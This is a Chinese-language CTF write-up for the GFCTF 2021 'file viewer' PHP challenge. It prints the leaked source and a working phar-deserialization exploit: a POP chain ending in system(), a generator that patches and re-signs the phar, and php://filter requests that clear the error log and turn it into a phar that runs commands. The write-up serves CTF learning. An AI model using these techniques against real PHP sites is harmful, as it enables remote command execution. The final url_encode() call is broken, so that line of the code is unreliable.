---
title: "每日一题"
date: 2026-05-26
lastmod: "2026-05-26T14:36:52+0800"
---
<!-- generated-by: obsidian_git_blog_pipeline -->

### `[GFCTF 2021]`文件查看器
```
题目标签
Linux命令
Phar反序列化
反序列化
WEB
PHP正则绕过
```

dirsearch扫描到www.zip，是源码泄漏

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260525221859410.png)

查看index.php
```
<?php
    function __autoload($className) {
        include("class/".$className.".class.php");
    }

    if(!isset($_GET['c'])){
        header("location:./?c=User&m=login");
    }else{
        $c=$_GET['c'];
        $class=new $c();
        if(isset($_GET['m'])){
            $m=$_GET['m'];
            $class->$m();
        }
    }
```

初始c=User&m=login

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260525222032497.png)

查看User.class.php发现账密为admin:admin
```
<?php
error_reporting(0);
class User{
    public $username;
    public $password;
    public function login(){
        include("view/login.html");
        if(isset($_POST['username'])&&isset($_POST['password'])){
            $this->username=$_POST['username'];
            $this->password=$_POST['password'];
            if($this->check()){
                header("location:./?c=Files&m=read");
            }
        }
    }
    public function check(){
        if($this->username==="admin" && $this->password==="admin"){
            return true;
        }else{
            echo "{$this->username}的密码不正确或不存在该用户";
            return false;
        }
    }
    public function __destruct(){
        (@$this->password)();
    }
    public function __call($name,$arg){ 
        ($name)();
    }
}
```

登陆后参数为c=Files&m=read，是文件查看器，还能重写
审计下Files.class.php源码

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260525222320751.png)

```
<?php
class Files{
    public $filename;
    public function __construct(){
        $this->log();
    }
    
    public function read(){
        include("view/file.html");
        if(isset($_POST['file'])){
            $this->filename=$_POST['file'];
        }else{
            die("请输入文件名");
        }
        $contents=$this->getFile();
        echo '<br><textarea class="file_content" type="text" value='."<br>".$contents;
    }
    
    public function filter(){
        if(preg_match('/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i',$this->filename)){
echo "这合理吗";
            throw new Error("这不合理");
        }
    }
    public function getFile(){
        $contents=file_get_contents($this->filename);
        $this->filter();
        if(isset($_POST['write'])){
            file_put_contents($this->filename,$contents);
        }
        if(!empty($contents)){
            return $contents;
        }else{
            die("该文件不存在或者内容为空");
        } 
    }
     public function log(){
        $log=new Myerror();
    }
    public function __get($key){
        ($key)($this->arg);
    }
}
```
能看到getFile()方法会运行file_get_contents文件包含，同时filter()在文件包含后执行因此可以忽略

再看一下Myerror.class.php
```
<?php
   class Myerror{
       public $message;
       public function __construct(){
           ini_set('error_log','/var/www/html/log/error.txt');
           ini_set('log_errors',1);
       }
       public function __tostring(){
           $test=$this->message->{$this->test};
           return "test";
       }
   }

```

Files类的构造方法会调用`$this->log();`即创建Myerror对象，而Myerror的构造方法会将error_log写入`/var/www/html/log/error.txt`

这里根据题目标签先进行反序列化pop链分析
```
User::__destruct()
-> User::check()
-> echo $this->username
-> Myerror::__toString()
-> Files::__get('system')
-> system($this->arg)
```
这里注意，再file_get_contents后执行的filter方法识别到phar会执行 `throw new Error("这不合理");`，这个异常会打断pop链，因此这里还需要强制GC回收触发__destruct()

把metadata从`[$u1, null]`，序列化后的尾部`i:1;N;`修改为`i:0;N;`，这个改动会导致phar尾部的签名失效，导致phar://会当作损坏phar，不能触发metadata反序列化

下为未修改metadata和签名的raw.php
```
<?php
$u1 = new User();
$u2 = new User();
$m = new Myerror();
$f = new Files();

$u1->password = [$u2, 'check'];
$u2->username = $m;
$m->message = $f;
$m->test = 'system';
$f->arg = 'cat /f*';

$meta = [$u1, null];

$phar = new Phar('raw.phar');
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($meta);
$phar->addFromString('test.txt', 'test');
$phar->setSignatureAlgorithm(Phar::SHA1);
$phar->stopBuffering();
```

但怎么把这个raw.phar写入到服务端呢，filter方法在file_put_contents前执行，走不通

这里可以通过日志写入内容到log/error.txt
当`file_get_contents($this->filename);`报错时，error.txt会写入`file_get_contents(payload): failed to open stream: No such file or directory`内容，这样之后读取phar://log/error.txt即可

但首选我们需要清空日志
传入并勾选 `write=1`
```
php://filter/read=consumed/resource=log/error.txt
```
`read=consumed` 读出来是空串，`file_put_contents()` 再写回同一路径，就会把底层日志文件清空

但同时还需要考虑raw.phar的传输问题，其经过
- HTTP 参数传输
- PHP 字符串处理
- warning 格式化
- 日志写入
需要剔除这些影响，可以使用编码格式转换解决
```
-> base64_encode
-> iconv(UTF-8, UCS-2)
-> quoted_printable_encode
-> urlencode 保证传输正确
```
用base64还不够，因为有前缀后缀
```
[time] PHP Warning: file_get_contents(你的payload): failed ...
```
`iconv(UTF-8 -> UCS-2)`再将base64 文本变成带空字节的宽字符形式：`QUJD`->`Q\x00U\x00J\x00D\x00`
`quoted-printable`把上面的 \x00 这种不可打印字节，再编码成可打印文本：`Q=00U=00J=00D=00`

最后使用php://filter将raw.phar恢复
```
<?php
if (PHP_SAPI !== 'cli') {
    fwrite(STDERR, "run in cli\n");
    exit(1);
}

if (!class_exists('Phar')) {
    fwrite(STDERR, "phar extension not loaded\n");
    exit(1);
}

class User {
    public $username;
    public $password;
}

class Files {
    public $filename;
    public $arg;
}

class Myerror {
    public $message;
    public $test;
}

function build_metadata($cmd) {
    $u1 = new User();
    $u2 = new User();
    $m = new Myerror();
    $f = new Files();

    $u1->password = [$u2, 'check'];
    $u2->username = $m;
    $m->message = $f;
    $m->test = 'system';
    $f->arg = $cmd;

    return [$u1, null];
}

function patch_fast_destruct($serialized) {
    $patched = str_replace('i:1;N;', 'i:0;N;', $serialized, $count);
    if ($count !== 1) {
        fwrite(STDERR, "fast-destruct patch failed\n");
        exit(1);
    }
    return $patched;
}

function repack_signature($data) {
    $magic = "GBMB";
    $sig_len = 20 + 4 + 4;
    if (strlen($data) < $sig_len || substr($data, -4) !== $magic) {
        fwrite(STDERR, "unexpected phar signature footer\n");
        exit(1);
    }
    $unsigned = substr($data, 0, -$sig_len);
    $hash = sha1($unsigned, true);
    return $unsigned . $hash . pack('V', 2) . $magic;
}

function encode_for_log($raw) {
    $b64 = base64_encode($raw);
    $ucs2 = iconv('UTF-8', 'UCS-2', $b64);
    if ($ucs2 === false) {
        fwrite(STDERR, "iconv failed\n");
        exit(1);
    }
    $qp = quoted_printable_encode($ucs2);
    $qp = preg_replace("/=\r\n/", '', $qp);
    return $qp . '=00=3D';
}

$cmd = $argv[1] ?? 'cat /f*';
$out_dir = __DIR__;
$raw_path = $out_dir . DIRECTORY_SEPARATOR . 'raw.phar';
$patched_path = $out_dir . DIRECTORY_SEPARATOR . 'patched.phar';

@unlink($raw_path);
@unlink($patched_path);

$meta = build_metadata($cmd);
$serialized = serialize($meta);
$patched_serialized = patch_fast_destruct($serialized);

$phar = new Phar($raw_path);
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($meta);
$phar->addFromString('test.txt', 'test');
$phar->setSignatureAlgorithm(Phar::SHA1);
$phar->stopBuffering();
unset($phar);

$raw = file_get_contents($raw_path);
if ($raw === false) {
    fwrite(STDERR, "read raw phar failed\n");
    exit(1);
}

$pos = strpos($raw, $serialized);
if ($pos === false) {
    fwrite(STDERR, "serialized metadata not found in phar\n");
    exit(1);
}

$patched = substr_replace($raw, $patched_serialized, $pos, strlen($serialized));
$patched = repack_signature($patched);

if (file_put_contents($patched_path, $patched) === false) {
    fwrite(STDERR, "write patched phar failed\n");
    exit(1);
}

echo url_encode(encode_for_log($patched), PHP_EOL);
```

```
$meta = build_metadata($cmd);
$serialized = serialize($meta);
$patched_serialized = patch_fast_destruct($serialized);
```
这里做的事其实很朴素：

1. 先正常构造对象链 $meta
2. 再把它 serialize() 成字符串
3. 然后直接对这个字符串做替换

也就是 patch_fast_destruct() 这段：

```
function patch_fast_destruct($serialized) {
    $patched = str_replace('i:1;N;', 'i:0;N;', $serialized, $count);
    if ($count !== 1) {
        fwrite(STDERR, "fast-destruct patch failed\n");
        exit(1);
    }
    return $patched;
}
```
这段把 `i:1;N;` 改成 `i:0;N;`
正常生成 phar 后，这段代码会先读回整个文件：
```
$raw = file_get_contents($raw_path);
```
然后用原始 metadata 序列化串去整个 phar 里搜：
```
$pos = strpos($raw, $serialized);
```
修改完的metadata直接在二进制文件里找这段完整的序列化内容进行替换
```
$patched = substr_replace($raw, $patched_serialized, $pos, strlen($serialized));
```

重签代码如下
```
function repack_signature($data) {
    $magic = "GBMB";
    $sig_len = 20 + 4 + 4;
    if (strlen($data) < $sig_len || substr($data, -4) !== $magic) {
        fwrite(STDERR, "unexpected phar signature footer\n");
        exit(1);
    }
    $unsigned = substr($data, 0, -$sig_len);
    $hash = sha1($unsigned, true);
    return $unsigned . $hash . pack('V', 2) . $magic;
}
```

encode编码部分代码如下
```
function encode_for_log($raw) {
    $b64 = base64_encode($raw);
    $ucs2 = iconv('UTF-8', 'UCS-2', $b64);
    if ($ucs2 === false) {
        fwrite(STDERR, "iconv failed\n");
        exit(1);
    }
    $qp = quoted_printable_encode($ucs2);
    $qp = preg_replace("/=\r\n/", '', $qp);
    return $qp . '=00=3D';
}
```

#### 利用流程

先清空error日志
```
file=php://filter/read=consumed/resource=log/error.txt&write=1
```
然后触发warning把生成的paylaod写入日志
```
file=<encoded_payload>
```
php filter协议恢复phar文件
```
file=php://filter/read=convert.quoted-printable-decode|convert.iconv.UCS-2.UTF-8|convert.base64-decode/resource=log/error.txt
&write=1
```
用phar协议读取触发反序列化
```
file=phar://log/error.txt/test.txt
```